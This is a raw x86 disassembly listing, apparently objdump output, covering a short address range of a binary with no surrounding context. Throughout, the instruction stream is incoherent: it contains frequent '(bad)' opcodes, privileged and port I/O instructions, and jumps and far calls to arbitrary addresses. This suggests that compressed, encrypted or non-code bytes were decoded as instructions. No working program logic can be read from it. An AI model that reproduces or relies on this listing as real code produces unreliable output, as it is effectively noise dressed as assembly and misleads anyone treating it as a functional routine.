  41f972:	push   ds
  41f973:	push   ebx
  41f974:	pushf  
  41f975:	mov    DWORD PTR [edi],esp
  41f977:	sbb    edx,DWORD PTR [edi-0x70]
  41f97a:	dec    esp
  41f97b:	and    BYTE PTR [edx+0x6cc7ae14],ch
  41f981:	xor    DWORD PTR [eax+0x3c],ebx
  41f984:	shr    BYTE PTR [edi-0x19],1
  41f987:	fdivr  QWORD PTR [ebp-0x4a680db1]
  41f98d:	add    eax,DWORD PTR [ebp+edx*8+0xe1b112d]
  41f994:	mov    DWORD PTR [eax-0x1f039398],esi
  41f99a:	rcl    DWORD PTR [edi+0x17b69d8d],1
  41f9a0:	fdiv   QWORD PTR [esi]
  41f9a2:	fsubr  QWORD PTR [esi+eiz*2-0x3a]
  41f9a6:	dec    eax
  41f9a7:	mov    al,ds:0x336f9e5c
  41f9ac:	or     DWORD PTR [ebp+0x5f],0x30
  41f9b0:	dec    ebp
  41f9b1:	add    eax,0x7d27ece0
  41f9b6:	or     esp,DWORD PTR [edx+0x6d]
  41f9b9:	xchg   esp,eax
  41f9ba:	adc    ah,ch
  41f9bc:	jne    0x41f9b7
  41f9be:	addr16 ret 0x3b93
  41f9c2:	jg     0x41f9eb
  41f9c4:	cmp    edx,edx
  41f9c6:	mov    edx,0x6709c97c
  41f9cb:	or     eax,0xad610dbc
  41f9d0:	loope  0x41f9fd
  41f9d2:	xchg   esi,eax
  41f9d3:	inc    BYTE PTR [edi]
  41f9d5:	jo     0x41fa55
  41f9d7:	jl     0x41f9ab
  41f9d9:	pop    ebx
  41f9da:	sbb    dh,bh
  41f9dc:	sbb    ecx,0xffffffe1
  41f9df:	push   DWORD PTR [edx]
  41f9e1:	push   0x27
  41f9e3:	mov    ch,BYTE PTR [edi]
  41f9e5:	push   0xa
	...
  41f9ef:	add    BYTE PTR [eax],al
  41f9f1:	mov    edi,0x9c801c2f
  41f9f6:	mov    bl,0xbf
  41f9f8:	aas    
  41f9f9:	sysexit 
  41f9fb:	pop    ecx
  41f9fc:	push   ss
  41f9fd:	jo     0x41f99e
  41f9ff:	jns    0x41fa1f
  41fa01:	mov    ch,0x74
  41fa03:	add    DWORD PTR [eax],eax
  41fa05:	scas   al,BYTE PTR es:[edi]
  41fa06:	add    eax,DWORD PTR [eax]
  41fa08:	add    BYTE PTR [edx+0x5f84512b],bl
  41fa0e:	jecxz  0x41fa3c
  41fa10:	pushf  
  41fa11:	jo     0x41fa43
  41fa13:	dec    esi
  41fa14:	xor    DWORD PTR [ebx+0x2],ecx
  41fa17:	add    esp,DWORD PTR [esi-0x14]
  41fa1a:	add    esp,DWORD PTR [ebx-0x35c5ffaf]
  41fa20:	ds inc edi
  41fa22:	and    esp,DWORD PTR [ebx-0x223c41de]
  41fa28:	retf   0xfeb8
  41fa2b:	ja     0x41f9c0
  41fa2d:	mov    bl,BYTE PTR [esi-0x383fa4a0]
  41fa33:	adc    DWORD PTR [ebx],edx
  41fa35:	sbb    bl,BYTE PTR [edx]
  41fa37:	sub    ebp,DWORD PTR [ebx]
  41fa39:	cld    
  41fa3a:	jge    0x41faaf
  41fa3c:	mov    eax,0x81f88706
  41fa41:	sbb    DWORD PTR [esi],esi
  41fa43:	aam    0x94
  41fa45:	jp     0x41fa3d
  41fa47:	test   eax,0xb9d5edb4
  41fa4c:	(bad)  
  41fa4d:	fiadd  DWORD PTR [ebp+0x1e]
  41fa50:	dec    ebx
  41fa51:	cli    
  41fa52:	xchg   ecx,eax
  41fa53:	das    
  41fa54:	inc    ebx
  41fa55:	loop   0x41fabc
  41fa57:	sub    DWORD PTR [ebx+0x5e25e923],eax
  41fa5d:	dec    esi
  41fa5e:	xor    al,0x39
  41fa60:	pop    edx
  41fa61:	sbb    DWORD PTR [ebx],0x74fab376
  41fa67:	sbb    DWORD PTR [ecx+0x2e],0xf031e204
  41fa6e:	push   ds
  41fa6f:	mov    edi,0xe64811f3
  41fa74:	cmp    eax,0xea60ca68
  41fa79:	out    dx,al
  41fa7a:	inc    eax
  41fa7b:	cmp    eax,DWORD PTR [ecx+ebx*1-0x7]
  41fa7f:	int3   
  41fa80:	sbb    BYTE PTR fs:[ebp+ecx*1-0x78beaff3],ch
  41fa88:	mov    ecx,0x9d36ee0e
  41fa8d:	jbe    0x41fada
  41fa8f:	aam    0x6f
  41fa91:	(bad)  
  41fa92:	neg    BYTE PTR [esi+edi*8+0x13811a1a]
  41fa99:	jmp    0xc99f214
  41fa9e:	add    ebx,edx
  41faa0:	xor    BYTE PTR [ebx-0x50371ff2],bl
  41faa6:	push   ebp
  41faa7:	sbb    al,0x9d
  41faa9:	out    0xc9,al
  41faab:	mov    eax,DWORD PTR fs:[edx+0x26ad5f32]
  41fab2:	iret   
  41fab3:	outs   dx,DWORD PTR ds:[esi]
  41fab4:	add    eax,0xcb2e9a85
  41fab9:	sub    ah,BYTE PTR gs:[ebp-0x7b]
  41fabd:	ins    DWORD PTR es:[edi],dx
  41fabe:	ss js  0x41fb20
  41fac1:	outs   dx,BYTE PTR ds:[esi]
  41fac2:	add    esp,DWORD PTR [eax]
  41fac4:	push   eax
  41fac5:	mov    esp,0x375daf4
  41faca:	pop    eax
  41facb:	jecxz  0x41fafc
  41facd:	test   eax,0x8599bcba
  41fad2:	pop    edi
  41fad3:	mov    eax,0x6ee4530b
  41fad8:	pop    esp
  41fad9:	cwde   
  41fada:	(bad)  
  41fadb:	xor    BYTE PTR [edi-0x3ba045b5],cl
  41fae1:	imul   ebp,ebp,0x95e2ebab
  41fae7:	scas   eax,DWORD PTR es:[edi]
  41fae8:	mov    ds:0xa8a31d6e,al
  41faed:	outs   dx,DWORD PTR ds:[esi]
  41faee:	loopne 0x41faee
  41faf0:	inc    ebp
  41faf1:	cmp    eax,0x1c08316
  41faf6:	jae    0x41fb17
  41faf8:	test   eax,0x39a22fc7
  41fafd:	je     0x41faa4
  41faff:	push   ss
  41fb00:	jmp    0x55cd6c7e
  41fb05:	test   WORD PTR [edi+ebp*8-0x4e11de00],0x8477
  41fb0f:	mov    al,BYTE PTR [ecx]
  41fb11:	sub    DWORD PTR [edx+0x13],eax
  41fb14:	(bad)  
  41fb15:	hlt    
  41fb16:	pop    esp
  41fb17:	mov    dh,0x87
  41fb19:	imul   eax,DWORD PTR [edi-0x25244277],0x5cde483a
  41fb23:	scas   al,BYTE PTR es:[edi]
  41fb24:	adc    bh,BYTE PTR ds:0xae146ebe
  41fb2a:	dec    eax
  41fb2b:	fild   DWORD PTR [edx-0x40]
  41fb2e:	or     eax,0x350e0075
  41fb33:	clc    
  41fb34:	retf   
  41fb35:	dec    BYTE PTR [ebx+0x3df41974]
  41fb3b:	and    si,dx
  41fb3e:	pop    esi
  41fb3f:	shl    esi,1
  41fb41:	mov    edi,ebx
  41fb43:	dec    edi
  41fb44:	push   ebx
  41fb45:	scas   eax,DWORD PTR es:[edi]
  41fb46:	cmc    
  41fb47:	mov    ebx,0x23521620
  41fb4c:	mov    esi,0x43fb662
  41fb51:	xlat   BYTE PTR ds:[ebx]
  41fb52:	mov    ds:0xd16c0dc6,al
  41fb57:	or     DWORD PTR [eax-0x2c],0xa671d42f
  41fb5e:	jb     0x41fb82
  41fb60:	xchg   esi,eax
  41fb61:	ja     0x41fb30
  41fb63:	jns    0x41fb58
  41fb65:	mov    ch,0xe5
  41fb67:	dec    esi
  41fb68:	add    eax,0x3a430eea
  41fb6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb6e:	mov    edi,0xf697e500
  41fb73:	push   ss
  41fb74:	mov    al,0xe7
  41fb76:	leave  
  41fb77:	jbe    0x41fb38
  41fb79:	sbb    BYTE PTR [esi-0x280b1561],bl
  41fb7f:	mov    dl,0xdb
  41fb81:	inc    edx
  41fb82:	xchg   ecx,eax
  41fb83:	fdiv   st,st(5)
  41fb85:	mov    edx,0xdbfb90d8
  41fb8a:	pop    ds
  41fb8b:	dec    cl
  41fb8d:	push   edi
  41fb8e:	pop    ebp
  41fb8f:	popw   ds
  41fb91:	mov    ds:0x1e221131,al
  41fb96:	sti    
  41fb97:	add    ecx,DWORD PTR [esi-0x4a14c021]
  41fb9d:	loop   0x41fbea
  41fb9f:	test   eax,0x407e3bcc
  41fba4:	cmp    BYTE PTR [edi+0x4c],al
  41fba7:	in     al,0x5d
  41fba9:	mov    DWORD PTR [ebx-0x44503414],esi
  41fbaf:	aam    0x10
  41fbb1:	clc    
  41fbb2:	mov    edi,0x7739f140
  41fbb7:	retf   
  41fbb8:	mov    edi,0x52896e88
  41fbbd:	mov    dh,0x50
  41fbbf:	adc    BYTE PTR [edi],dl
  41fbc1:	bound  ecx,QWORD PTR [ebx+ecx*1-0x250df5c1]
  41fbc8:	pop    es
  41fbc9:	cmp    ch,BYTE PTR [ecx]
  41fbcb:	jno    0x41fc26
  41fbcd:	inc    edi
  41fbce:	sti    
  41fbcf:	out    0x17,al
  41fbd1:	jmp    0x75962c93
  41fbd6:	(bad)  
  41fbd7:	jnp    0x41fb88
  41fbd9:	pop    ebx
  41fbda:	adc    edi,DWORD PTR [ebx]
  41fbdc:	fxch   st(3)
  41fbde:	imul   ecx,esp,0x6c
  41fbe1:	imul   BYTE PTR [edi+0x43]
  41fbe4:	aaa    
  41fbe5:	xor    al,0x93
  41fbe7:	pop    es
  41fbe8:	mov    al,ds:0x35003973
  41fbed:	test   eax,0xe1c9126d
  41fbf2:	aas    
  41fbf3:	pop    edi
  41fbf4:	iret   
  41fbf5:	shl    DWORD PTR [edx+ebp*4+0x13880a1b],1
  41fbfc:	inc    ebp
  41fbfd:	dec    ebx
  41fbfe:	cmc    
  41fbff:	retf   0x2583
  41fc02:	rcr    ah,1
  41fc04:	sbb    dl,BYTE PTR [ebx]
  41fc06:	pushf  
  41fc07:	adc    al,ah
  41fc09:	or     esp,DWORD PTR [ecx+0x5e5d8d74]
  41fc0f:	(bad)  
  41fc10:	mul    BYTE PTR [esi+edi*8+0x51]
  41fc14:	or     al,BYTE PTR [ecx+0x49]
  41fc17:	xchg   edx,eax
  41fc18:	in     eax,0x44
  41fc1a:	mov    dh,0x77
  41fc1c:	jo     0x41fbeb
  41fc1e:	dec    eax
  41fc1f:	jp     0x41fbfd
  41fc21:	jle    0x41fbde
  41fc23:	jnp    0x41fc11
  41fc25:	test   al,al
  41fc27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc28:	ffreep st(6)
  41fc2a:	mov    ecx,0xb7b0df82
  41fc2f:	sar    DWORD PTR [ebx],0x8d
  41fc32:	adc    al,0x17
  41fc34:	ja     0x41fbde
  41fc36:	fmulp  st(7),st
  41fc38:	call   0x16d203ab
  41fc3d:	jne    0x41fcb0
  41fc3f:	jbe    0x41fc30
  41fc41:	jno    0x41fc2a
  41fc43:	test   al,0xb0
  41fc45:	sub    ecx,DWORD PTR [eax-0x1e]
  41fc48:	and    BYTE PTR [esp+edx*8-0x23],dh
  41fc4c:	scas   eax,DWORD PTR es:[edi]
  41fc4d:	dec    esi
  41fc4e:	in     al,0xca
  41fc50:	xchg   esp,eax
  41fc51:	ja     0x41fc02
  41fc53:	dec    ebx
  41fc54:	mov    ch,0xaa
  41fc56:	dec    ecx
  41fc57:	add    BYTE PTR [ebx],dh
  41fc59:	mov    ds:0xef9204aa,eax
  41fc5e:	push   eax
  41fc5f:	add    eax,0x5510bbbc
  41fc64:	jo     0x41fc19
  41fc66:	xchg   ecx,eax
  41fc67:	push   esi
  41fc68:	sbb    esi,eax
  41fc6a:	inc    ebx
  41fc6b:	jp     0x41fc7e
  41fc6d:	retf   
  41fc6e:	outs   dx,BYTE PTR ds:[esi]
  41fc6f:	jns    0x41fc80
  41fc71:	push   esp
  41fc72:	push   esi
  41fc73:	jae    0x41fc93
  41fc75:	sbb    BYTE PTR ds:0x698cc804,bh
  41fc7b:	push   es
  41fc7c:	xchg   ebp,eax
  41fc7d:	xchg   edi,eax
  41fc7e:	and    DWORD PTR [ebp+0x6cd0e5f2],0x29
  41fc85:	adc    al,0x3b
  41fc87:	pop    es
  41fc88:	not    DWORD PTR [eax-0x472bece0]
  41fc8e:	pushf  
  41fc8f:	jl     0x41fc61
  41fc91:	pop    es
  41fc92:	fidiv  WORD PTR [ebx+ecx*4+0x3b4fd9d8]
  41fc99:	test   BYTE PTR [ecx-0x1d],cl
  41fc9c:	and    eax,0xd5a4687
  41fca1:	js     0x41fc32
  41fca3:	aas    
  41fca4:	sub    DWORD PTR [edi],edx
  41fca6:	mov    esi,0xa49810b2
  41fcab:	ret    0x627f
  41fcae:	fnsave [eax]
  41fcb0:	leave  
  41fcb1:	aas    
  41fcb2:	repnz push esp
  41fcb4:	xor    eax,0x8e4367e6
  41fcb9:	add    cl,BYTE PTR [ebx]
  41fcbb:	aas    
  41fcbc:	in     eax,dx
  41fcbd:	pop    esi
  41fcbe:	imul   ecx,DWORD PTR [eax-0x4],0xffffff90
  41fcc2:	jnp    0x41fc78
  41fcc4:	push   esi
  41fcc5:	and    bh,BYTE PTR [edi]
  41fcc7:	es adc eax,0x4694afac
  41fccd:	or     BYTE PTR [esi],0x93
  41fcd0:	mov    edi,DWORD PTR [ebx+0x54]
  41fcd3:	cld    
  41fcd4:	sbb    DWORD PTR [edi],eax
  41fcd6:	clc    
  41fcd7:	scas   al,BYTE PTR es:[edi]
  41fcd8:	dec    ebx
  41fcd9:	fisub  WORD PTR [ebx+0x67a25bbb]
  41fcdf:	popa   
  41fce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fce1:	leave  
  41fce2:	nop
  41fce3:	sub    al,BYTE PTR [ebp-0x11800b4c]
  41fce9:	ror    DWORD PTR cs:[ecx-0x6a],cl
  41fced:	inc    esi
  41fcee:	xchg   BYTE PTR [edx-0x1f],ch
  41fcf1:	push   esi
  41fcf2:	js     0x41fcfc
  41fcf4:	dec    ebp
  41fcf5:	jl     0x41fd62
  41fcf7:	lea    ebx,[edx-0x46ebd83c]
  41fcfd:	xor    eax,0xbcee82bb
  41fd02:	test   al,0x1f
  41fd04:	xor    ebx,DWORD PTR [esi]
  41fd06:	in     al,dx
  41fd07:	mov    ds:0x67cd9314,eax
  41fd0c:	(bad)  
  41fd0d:	loop   0x41fd3f
  41fd0f:	stos   DWORD PTR es:[edi],eax
  41fd10:	push   ecx
  41fd11:	sub    ebx,DWORD PTR [edx]
  41fd13:	aaa    
  41fd14:	jmp    DWORD PTR [eax+edi*1-0x43]
  41fd18:	pop    eax
  41fd19:	test   al,0x92
  41fd1b:	and    eax,0xb938fec6
  41fd20:	fsubr  st,st(2)
  41fd22:	xchg   ebx,eax
  41fd23:	aad    0x2
  41fd25:	adc    DWORD PTR [ecx],esp
  41fd27:	adc    bl,BYTE PTR [ecx-0x6f]
  41fd2a:	inc    ecx
  41fd2b:	in     eax,dx
  41fd2c:	aad    0x25
  41fd2e:	lahf   
  41fd2f:	mov    eax,0xc95e5afb
  41fd34:	cmp    ah,BYTE PTR [eax+eiz*1+0x6a]
  41fd38:	mov    ebp,0x106007c0
  41fd3d:	retf   0xf02a
  41fd40:	sbb    dh,al
  41fd42:	push   ss
  41fd43:	fisttp WORD PTR [ecx+0x66da8084]
  41fd49:	and    dl,cl
  41fd4b:	repnz inc esi
  41fd4d:	mov    ebp,DWORD PTR [ebx+0x4]
  41fd50:	jl     0x41fd54
  41fd52:	into   
  41fd53:	pushf  
  41fd54:	ret    
  41fd55:	mov    edi,0x78407dcf
  41fd5a:	or     eax,0x5c07f103
  41fd5f:	inc    edx
  41fd60:	in     al,0xb7
  41fd62:	jp     0x41fd71
  41fd64:	jge    0x41fddc
  41fd66:	and    cl,al
  41fd68:	hlt    
  41fd69:	in     eax,dx
  41fd6a:	push   ebp
  41fd6b:	xchg   DWORD PTR [ecx+0x2892a9fc],ebp
  41fd71:	mov    ebx,fs
  41fd73:	sbb    edi,ebx
  41fd75:	dec    edi
  41fd76:	mov    ebp,0x663869e5
  41fd7b:	mov    edi,0x7e0b25e8
  41fd80:	xor    BYTE PTR [edx+0x7f],cl
  41fd83:	mov    eax,0xc967764a
  41fd88:	gs iret 
  41fd8a:	add    DWORD PTR [edx+0x2e],ebp
  41fd8d:	stos   DWORD PTR es:[edi],eax
  41fd8e:	cmp    al,0xc8
  41fd90:	loope  0x41fda2
  41fd92:	lods   eax,DWORD PTR ds:[esi]
  41fd93:	mov    ds:0x6dc873b7,eax
  41fd98:	sub    ebx,DWORD PTR [edi+0x15]
  41fd9b:	xor    bl,BYTE PTR [eax+0x2f]
  41fd9e:	add    eax,ecx
  41fda0:	hlt    
  41fda1:	mov    ds:0xcf760832,al
  41fda6:	fsubr  QWORD PTR [edx]
  41fda8:	inc    esi
  41fda9:	add    DWORD PTR [edx],ebx
  41fdab:	mov    ch,0x88
  41fdad:	mov    dl,0xc7
  41fdaf:	add    al,0xbb
  41fdb1:	popa   
  41fdb2:	fsub   DWORD PTR cs:[edi-0x5c]
  41fdb6:	int3   
	...
  41fdbf:	add    BYTE PTR [eax],al
  41fdc1:	mov    DWORD PTR [esi+esi*4-0x320c400d],esi
  41fdc8:	(bad)  
  41fdc9:	push   ebp
  41fdca:	cmp    BYTE PTR [edx-0x7a],bl
  41fdcd:	sbb    bl,BYTE PTR [ebx+0x3]
  41fdd0:	iret   
  41fdd1:	arpl   WORD PTR [eax+0x1],di
  41fdd4:	add    BYTE PTR [esi-0x49fffffd],ch
  41fdda:	push   eax
  41fddb:	mov    al,0xa2
  41fddd:	push   ss
  41fdde:	adc    eax,0x72d8b118
  41fde3:	cmc    
  41fde4:	adc    al,0x8a
  41fde6:	fild   QWORD PTR [edi]
  41fde8:	leave  
  41fde9:	pop    edi
  41fdea:	fs cmc 
  41fdec:	mov    edx,0xb18809cb
  41fdf1:	fcmovne st,st(5)
  41fdf3:	push   ecx
  41fdf4:	(bad)  
  41fdf5:	clc    
  41fdf6:	(bad)  
  41fdf7:	cmc    
  41fdf8:	(bad)  [esi-0x7b]
  41fdfb:	icebp  
  41fdfc:	cmc    
  41fdfd:	or     eax,eax
  41fdff:	add    BYTE PTR [ebp+0x72],al
  41fe02:	lds    eax,FWORD PTR [eax-0x4ad2776d]
  41fe08:	xchg   esp,eax
  41fe09:	mov    ds:0xdc85da89,eax
  41fe0e:	mov    esp,0xac6708fd
  41fe13:	pop    ecx
  41fe14:	and    eax,0x49c639d6
  41fe19:	sbb    al,0x9d
  41fe1b:	mov    dh,0x5a
  41fe1d:	pop    ss
  41fe1e:	xchg   esi,eax
  41fe1f:	and    BYTE PTR [esi-0x2a],dh
  41fe22:	cmp    BYTE PTR [ebx],dl
  41fe24:	ficom  WORD PTR [eax-0x6c]
  41fe27:	xchg   esi,eax
  41fe28:	lea    ecx,[eax-0x2f]
  41fe2b:	pusha  
  41fe2c:	leave  
  41fe2d:	jae    0x41fde4
  41fe2f:	jns    0x41fe9b
  41fe31:	inc    esi
  41fe32:	push   eax
  41fe33:	adc    DWORD PTR [edx-0x1497b90b],edx
  41fe39:	fnstenv [edi+0x7]
  41fe3c:	sub    ecx,ecx
  41fe3e:	push   cs
  41fe3f:	sbb    dh,dh
  41fe41:	js     0x41fe04
  41fe43:	mov    al,ds:0xfa039b5a
  41fe48:	mov    ds:0x5f768c12,al
  41fe4d:	out    dx,al
  41fe4e:	dec    ah
  41fe50:	dec    ebp
  41fe51:	fimul  DWORD PTR [ecx+0x62]
  41fe54:	dec    edi
  41fe55:	xor    esp,DWORD PTR [edi]
  41fe57:	sub    cl,BYTE PTR [edx]
  41fe59:	mov    ah,0x63
  41fe5b:	pop    esi
  41fe5c:	and    cl,BYTE PTR [esi]
  41fe5e:	xor    eax,0x48cb8e33
  41fe63:	les    esi,FWORD PTR [ebx-0x386058dd]
  41fe69:	xchg   esp,eax
  41fe6a:	sbb    al,BYTE PTR [ecx+eiz*2-0xd7ed3bb]
  41fe71:	fistp  QWORD PTR [ebx-0x3c]
  41fe74:	(bad)  
  41fe76:	jb     0x41feba
  41fe78:	push   edx
  41fe79:	dec    ecx
  41fe7a:	(bad)  
  41fe7b:	leave  
  41fe7c:	leave  
  41fe7d:	push   eax
  41fe7e:	lea    ebx,ds:0x805f7d73
  41fe84:	cmc    
  41fe85:	mov    ds:0x3598ea3a,eax
  41fe8a:	sub    ah,BYTE PTR [edi-0x71d5ea4d]
  41fe90:	imul   esp,DWORD PTR ds:0xc71edd9,0xffffffc1
  41fe97:	lahf   
  41fe98:	xor    edi,DWORD PTR [eax-0x19746f01]
  41fe9e:	mov    ds:0x8f154f76,al
  41fea3:	stos   BYTE PTR es:[edi],al
  41fea4:	hlt    
  41fea5:	sti    
  41fea6:	mov    dl,0x92
  41fea8:	xchg   ebp,eax
  41fea9:	mov    ebp,0xfe5e5557
  41feae:	sbb    al,BYTE PTR [ecx-0x493b1910]
  41feb4:	(bad)  
  41feb6:	scas   al,BYTE PTR es:[edi]
  41feb7:	push   ss
  41feb8:	cs clc 
  41feba:	dec    ebx
  41febb:	(bad)  
  41febc:	int3   
  41febd:	mov    DWORD PTR [esi-0x1c24a204],ebp
  41fec3:	cmp    BYTE PTR [esi+ebx*8],0xe4
  41fec7:	retf   0xbae
  41feca:	fsub   DWORD PTR [edi-0x2e]
  41fecd:	push   0xb2655ad8
  41fed2:	cmp    dh,BYTE PTR [edi-0x1e]
  41fed5:	push   ebx
  41fed6:	mov    ds:0x7bb24846,eax
  41fedb:	test   BYTE PTR gs:[eax-0x13],bl
  41fedf:	jb     0x41fe7a
  41fee1:	xchg   edx,eax
  41fee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fee3:	stc    
  41fee4:	mov    BYTE PTR [edx+esi*8-0x1d],dl
  41fee8:	ror    DWORD PTR [eax-0x16],cl
  41feeb:	fiadd  DWORD PTR [edx]
  41feed:	gs int3 
  41feef:	mov    ch,0x6f
  41fef1:	adc    BYTE PTR [esi],bl
  41fef3:	rcr    DWORD PTR [ebx-0x179b581],0x11
  41fefa:	xlat   BYTE PTR ds:[ebx]
  41fefb:	mov    esi,0x3c67594d
  41ff00:	or     ebp,0xffffff8a
  41ff03:	aam    0xa6
  41ff05:	ins    DWORD PTR es:[edi],dx
  41ff06:	or     BYTE PTR [edi+edx*2-0x71],dl
  41ff0a:	or     cl,BYTE PTR [ecx]
  41ff0c:	jbe    0x41fec3
  41ff0e:	popf   
  41ff0f:	not    DWORD PTR gs:0x1633ed60
  41ff16:	and    DWORD PTR [ebp+0xf],edi
  41ff19:	cmp    eax,0x9070375f
  41ff1e:	pop    es
  41ff1f:	popf   
  41ff20:	sbb    bh,BYTE PTR [ebx+0x5e31ad1f]
  41ff26:	mov    WORD PTR [eax+0x58f25fa],ss
  41ff2c:	ja     0x41ff7d
  41ff2e:	xchg   esp,eax
  41ff2f:	gs int 0x7e
  41ff32:	mov    al,0x5f
  41ff34:	xchg   BYTE PTR [esi+0x7644210f],bl
  41ff3a:	in     eax,0xd9
  41ff3c:	xchg   esp,eax
  41ff3d:	ror    DWORD PTR [ecx],1
  41ff3f:	aad    0xea
  41ff41:	push   eax
  41ff42:	inc    ecx
  41ff43:	jmp    0xff862dd2
  41ff48:	xor    eax,0x314d63d3
  41ff4d:	loop   0x41fee1
  41ff4f:	sub    al,0x4d
  41ff51:	dec    esp
  41ff52:	inc    esi
  41ff53:	fwait
  41ff54:	pop    esi
  41ff55:	repnz repz cmc 
  41ff58:	outs   dx,BYTE PTR ds:[esi]
  41ff59:	xor    BYTE PTR [esi-0x1e9c277],ah
  41ff5f:	mov    ds,WORD PTR [esi-0x5f]
  41ff62:	lds    esp,FWORD PTR [edi-0x66]
  41ff65:	jp     0x41ff62
  41ff67:	cmp    bh,bh
  41ff69:	mov    dh,0x2b
  41ff6b:	les    ebx,FWORD PTR [ebp-0x4ff7872a]
  41ff71:	sbb    DWORD PTR [ebp+0x2d051624],edi
  41ff77:	imul   esi,esp,0x56
  41ff7a:	mov    ss,WORD PTR [eax-0x52]
  41ff7d:	sub    BYTE PTR [ecx],al
  41ff7f:	or     ebx,DWORD PTR [esp+ebp*8]
  41ff82:	pop    edi
  41ff83:	stos   DWORD PTR es:[edi],eax
  41ff84:	jne    0x41ff12
  41ff86:	and    edx,DWORD PTR [ebp+edi*8+0x50ed2600]
  41ff8d:	push   0xf7df5122
  41ff92:	mov    ah,BYTE PTR [eax+0x71]
  41ff95:	clc    
  41ff96:	in     eax,dx
  41ff97:	mov    ebp,0xfbd75664
  41ff9c:	call   0xed507ac9
  41ffa1:	rol    ch,cl
  41ffa3:	sub    eax,edx
  41ffa5:	rcl    BYTE PTR [edi-0x6b97cefa],cl
  41ffab:	lds    edi,FWORD PTR [ecx+0xe58f1c3]
  41ffb1:	jbe    0x41ffeb
  41ffb3:	mov    ds:0xcf58e0ce,al
  41ffb8:	add    BYTE PTR [edi],cl
  41ffba:	adc    BYTE PTR [eax-0x36],dh
  41ffbd:	dec    esp
  41ffbe:	fs xor al,0x18
  41ffc1:	dec    ecx
  41ffc2:	adc    esi,ebp
  41ffc4:	cmp    eax,0x6cac8d28
  41ffc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffca:	jne    0x41ffdc
  41ffcc:	inc    edi
  41ffcd:	inc    BYTE PTR [esi+0x71]
  41ffd0:	loopne 0x41ff72
  41ffd2:	push   ss
  41ffd3:	not    DWORD PTR [edx]
  41ffd5:	and    eax,0x5dd25432
  41ffda:	and    eax,0x3b9b4b57
  41ffdf:	in     al,0x7d
  41ffe1:	ss mov cl,0xad
  41ffe4:	inc    edx
  41ffe5:	imul   edx,esi,0xef07dd96
  41ffeb:	test   eax,0x7bb518b3
  41fff0:	call   0x3265:0x5e73ca67
  41fff7:	shr    esp,cl
  41fff9:	dec    ebx
  41fffa:	outs   dx,BYTE PTR ds:[esi]
  41fffb:	xchg   ebx,eax
  41fffc:	stos   BYTE PTR es:[edi],al
  41fffd:	scas   al,BYTE PTR es:[edi]
  41fffe:	loop   0x41ffd3
  420000:	adc    ebp,eax
  420002:	paddq  mm0,mm1
  420005:	xchg   BYTE PTR [esp+ebp*2-0x60],dh
  420009:	fisttp WORD PTR [edi-0x3e]
  42000c:	into   
  42000d:	and    BYTE PTR [esi-0x10],al
  420010:	(bad)  
  420011:	test   eax,0x841a998e
  420016:	enter  0x81c1,0x69
  42001a:	fsubr  QWORD PTR [ecx+ebx*8+0x7b355b55]
  420021:	test   BYTE PTR [ecx+eiz*4],bh
  420024:	rol    BYTE PTR [esi+edx*8+0xc],1
  420028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420029:	imul   edx,DWORD PTR [edi],0xffffff89
  42002c:	popf   
  42002d:	outs   dx,DWORD PTR ds:[esi]
  42002e:	adc    BYTE PTR [edi-0x3a408e81],0x79
  420035:	stos   DWORD PTR es:[edi],eax
  420036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420037:	pop    ebp
  420038:	sbb    BYTE PTR [edi+0x744117d9],dh
  42003e:	adc    dh,BYTE PTR [eax-0x64]
  420041:	call   0xebcf:0x4a4391e1
  420048:	add    al,0xec
  42004a:	push   esp
  42004b:	mov    ecx,0x43b936a4
  420050:	xchg   ebp,eax
  420051:	jb     0x4200bd
  420053:	pop    esi
  420054:	stos   DWORD PTR es:[edi],eax
  420055:	call   0xf8212291
  42005a:	pop    ecx
  42005b:	fs jmp 0x41fff2
  42005e:	sbb    ch,bh
  420060:	loop   0x41fff0
  420062:	add    cl,dh
  420064:	pop    esi
  420065:	push   edi
  420066:	hlt    
  420067:	cmp    BYTE PTR [esi],ch
  420069:	arpl   WORD PTR [edx],dx
  42006b:	dec    eax
  42006c:	or     dh,BYTE PTR [edx+0x36]
  42006f:	cld    
  420070:	push   ebp
  420071:	icebp  
  420072:	push   edi
  420073:	in     al,dx
  420074:	dec    edi
  420075:	int3   
  420076:	jmp    0x6a0e04f6
  42007b:	mov    bh,0xc5
  42007d:	sbb    ch,BYTE PTR [ecx+0x1b8e2fba]
  420083:	xor    DWORD PTR [edi],eax
  420085:	adc    edx,DWORD PTR ds:0x2a689f46
  42008b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42008c:	clc    
  42008d:	dec    ebp
  42008e:	test   al,0x40
  420090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420091:	fsub   DWORD PTR [esi+0x5f]
  420094:	push   0x37
  420096:	inc    ecx
  420097:	add    edx,DWORD PTR [edx]
  420099:	scas   al,BYTE PTR es:[edi]
  42009a:	adc    bh,bh
  42009c:	je     0x420051
  42009e:	cmp    eax,0x1a5585c5
  4200a3:	xor    al,0x9d
  4200a5:	stc    
  4200a6:	ins    DWORD PTR es:[edi],dx
  4200a7:	pop    ss
  4200a8:	ja     0x4200f5
  4200aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200ab:	lock inc edi
  4200ad:	mov    ?,WORD PTR [edx+ebx*8-0x2e381c96]
  4200b4:	xor    ebx,0xffffff9e
  4200b7:	fcomip st,st(3)
  4200b9:	inc    esp
  4200ba:	out    dx,eax
  4200bb:	dec    edi
  4200bc:	shl    BYTE PTR [ebx+0x35],cl
  4200bf:	fnstenv [eax]
  4200c1:	jl     0x420140
  4200c3:	jns    0x420063
  4200c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200c6:	pop    ebx
  4200c7:	test   BYTE PTR [edx-0x3e3bed8f],ah
  4200cd:	dec    eax
  4200ce:	jp     0x420149
  4200d0:	popa   
  4200d1:	jp     0x4200cc
  4200d3:	loop   0x4200e7
  4200d5:	div    BYTE PTR [ebp+eax*2-0x30e66d68]
  4200dc:	int    0x7a
  4200de:	leave  
  4200df:	jns    0x420153
  4200e1:	adc    edx,esp
  4200e3:	retf   0xe762
